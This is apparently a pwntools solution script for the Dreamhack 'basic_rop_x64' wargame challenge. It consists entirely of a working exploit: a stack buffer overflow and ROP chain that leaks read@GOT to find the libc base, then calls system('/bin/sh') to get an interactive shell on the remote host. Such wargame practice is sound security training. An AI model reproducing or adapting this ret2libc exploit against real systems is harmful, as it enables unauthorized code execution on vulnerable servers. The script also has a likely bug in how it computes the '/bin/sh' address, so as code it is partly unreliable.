from pwn import *
p = remote("host3.dreamhack.games", 24411)
e = ELF("./basic_rop_x64")
lib = ELF("./libc.so.6")

pop_rdi = 0x0000000000400883
pop_rsi_r15 = 0x0000000000400881
ret = 0x00000000004005a9

writeplt = e.plt['write']
readplt = e.plt['read']
readgot = e.got['read']
sh = sh = next(lib.search(b"/bin/sh"))


buf = b'A' * (0x40 + 8)
payload = buf
# write(1, readgot, 8)
payload += p64(pop_rdi) + p64(1)
payload += p64(pop_rsi_r15) + p64(readgot) + p64(0)
payload += p64(writeplt)
payload += p64(e.sym['main'])

p.send(payload)
buf = b'A' * 0x40
p.recvuntil(buf)
readlib = u64(p.recv(6) + b'\x00\x00')
libase = readlib - lib.symbols['read']
system = libase + lib.symbols['system']
print('read', readlib)
print('libc_base', libase)
print('system', system)

payload =  b'A' * (0x40 + 8)
payload += p64(pop_rdi) + p64(libase + sh)
# payload += p64(ret)
payload += p64(system)


p.send(payload)
p.interactive()